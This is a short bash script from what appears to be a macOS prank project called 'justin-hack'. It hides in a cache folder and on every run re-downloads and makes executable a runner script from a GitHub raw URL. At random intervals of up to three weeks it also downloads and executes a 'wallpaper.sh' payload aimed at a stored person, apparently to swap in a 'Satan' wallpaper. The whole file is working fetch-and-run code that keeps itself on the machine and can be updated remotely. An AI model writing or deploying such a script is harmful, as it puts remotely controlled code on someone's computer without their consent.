#!/usr/bin/env bash

## Vars
jh=~/Library/Caches/jh
baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master

#
timestamp=`date +'%s'`
min=60
max=1814400
now=$(date +"%s")
next_timestamp=0

# Update Runner
curl -o $jh/runner.sh $baseurl/runner.sh?q=$timestamp > /dev/null
chmod +x $jh/runner.sh


if [ -f $jh/.next ]; then
    next_timestamp=$(<$jh/.next)
fi

if [ $now -ge $next_timestamp ]; then
    # Get Satan Wallpaper
    curl -o $jh/wallpaper.sh $baseurl/wallpaper.sh?q=$timestamp > /dev/null
    chmod +x $jh/wallpaper.sh
    cat $jh/.person | xargs $jh/wallpaper.sh

    # Save next crontab
    random=$((($RANDOM$RANDOM%($max-$min+1))/1*1+$min))
    next=$(($now+$random))
    echo "$next" > $jh/.next
fi



